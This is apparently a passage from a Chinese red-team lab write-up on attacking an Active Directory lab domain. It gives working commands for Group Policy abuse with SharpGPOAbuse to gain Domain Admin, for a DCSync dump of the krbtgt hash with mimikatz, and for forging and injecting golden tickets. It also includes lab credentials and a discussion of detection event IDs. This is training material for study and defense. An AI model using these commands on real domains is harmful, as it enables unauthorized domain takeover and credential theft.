[![](https://p5.ssl.qhimg.com/t012bdc5a6ebbb687e4.jpg)](https://p5.ssl.qhimg.com/t012bdc5a6ebbb687e4.jpg)

然后寻找到域控的最短攻击路径

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01771a49c89033e9d1.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012f66518b81e62c04.jpg)

> 这里显示用户对域控的组策略有写入权限（GenericWrite），通过组策略利用，攻击DC

前面的练习显示用户“taskservice”对“默认域控制器”组策略具有写入权限。我们将使用它来获得域管理员权限。

[![](https://p2.ssl.qhimg.com/t01b2f9ebab9b09c50f.jpg)](https://p2.ssl.qhimg.com/t01b2f9ebab9b09c50f.jpg)

使用taskserivce用户登录，需要密码，密码我们之前通过Kerberoasting<br>
已经拿到了，Amsterdam2015

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c9ea17e471cbc491.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013dd3892d7c5b9573.jpg)

因为我把工具放在john 桌面上的，这里是没有权限，因为john 已经是作为打域的口子了，已经被拿下，把工具放在C:\下面就行。

```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author contoso\adminuser --Command "cmd.exe" --Arguments '/c net group \"Domain Admins\" john /ADD' --GPOName "Default Domain Controllers Policy" --force
```

[![](https://p5.ssl.qhimg.com/t015bb742e80e5c33cd.jpg)](https://p5.ssl.qhimg.com/t015bb742e80e5c33cd.jpg)

现在已经将 john 用户添加到域管这个用户组了，但是真实环境中，必须等到域管重新更新组策略才会触发。这里直接在域控上手工更新了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0177b77cd59208929b.jpg)

成功将域普通用户提权为域管理员。

然后成功登录域控：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cb0e27976ed9f465.jpg)

[![](https://p1.ssl.qhimg.com/t01fdbb056c0fdaefc9.jpg)](https://p1.ssl.qhimg.com/t01fdbb056c0fdaefc9.jpg)



## Exercise 6 – Persistence（权限维持）
- mimikatz 后门
- 白银票据、黄金票据
- and so on
因为我们现在已经有了域管权限（Administrators, Domain Admins, Enterprise Admins 都可以），可以通过 DCSync attack 来进行一个权限维持

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0156b78dd6cfe7ba18.jpg)

这里用的是mimikatz，

```
lsadump::dcsync /user:krbtgt
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019d56690c5b00cb66.jpg)

[![](https://p0.ssl.qhimg.com/t01b4529afcf3d169f7.jpg)](https://p0.ssl.qhimg.com/t01b4529afcf3d169f7.jpg)

拿到域内所有用户的hash。



## 第六章问题
- 使用mimikatz 制作黄金票据（使用Chuck Norris用户），在域控上查看事件id是不是4624，黄金票据登录和正常登录有什么区别。
> 正常来说认证访服务的流程是先4768（TGT）-4769（TGS）-4624（logon），但是黄金票据攻击的话只会有4769-4624，因为TGT已经离线生成了
- 再制作一个黄金票据，要求这个用户在AD里不存在，RID为500，/id:500，然后使用这个票据去访问SMB或者远程PowerShell。那个能成功访问到。
在DCsync Attack的时候已经获取到了 krbtgt用户的hash了，现在还需要获得域用户的sid。

```
whoami /user（在cnorris的cmd）
或者
lsadump::dcsync /user:cnorris
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010feec49fecbb51d2.jpg)

```
S-1-5-21-2285992356-195623764-2499460835-1106
```

然后制作黄金票据：

```
kerberos::golden /domain:redteamlab.com /sid:S-1-5-21-2285992356-195623764-2499460835-1106 /krbtgt:37710395b3dbb0e193a6a79b7831859c /user:cnorris /ticket:golden.kirib
```

导入伪造的票据，看能不能获取到域控权限。

```
kerberos::purge
kerberos::ptt golden.kiribi
kerberos::list
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016fa26bdafd26bcb5.jpg)

成功访问到域控的共享文件夹。<br>
然后登录域控查看事件

问题二：

[![](https://p3.ssl.qhimg.com/t014ba1fe0eadd4b4c1.jpg)](https://p3.ssl.qhimg.com/t014ba1fe0eadd4b4c1.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0155d870daa4f577f8.jpg)

> 感谢Long716、七友、官哥的一些指点



## 参考资料

[https://stealthbits.com/blog/what-is-dcsync-an-introduction/](https://stealthbits.com/blog/what-is-dcsync-an-introduction/)<br>[https://zhuanlan.zhihu.com/p/386873445](https://zhuanlan.zhihu.com/p/386873445)<br>[https://docs.microsoft.com/zh-cn/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain](https://docs.microsoft.com/zh-cn/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain)<br>[https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting)
